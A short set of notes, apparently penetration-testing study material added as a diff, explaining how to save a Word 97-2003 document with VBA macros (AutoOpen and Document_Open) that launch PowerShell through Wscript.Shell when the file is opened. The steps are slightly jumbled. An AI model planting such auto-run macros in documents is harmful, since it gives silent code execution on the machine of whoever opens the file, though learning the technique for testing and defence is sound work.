@@ -1,0 +1,21 @@
+Save document as word 97-2003 document.
+Open Words --> View --> Click on Macros --> Popup appears --> Name it as something.
+Sub AutoOpen()
+
+In VBA enter below script
+
+MyMacro
+
+End Sub
+Sub Document_Open()
+ MyMacro
+
+End Sub
+Sub MyMacro()
+ CreateObject("Wscript.Shell").Run "powershell"
+
+End Sub
+
+click on the Save icon in the Microsoft Visual Basic for Application window & close document.
+
+Re-open 
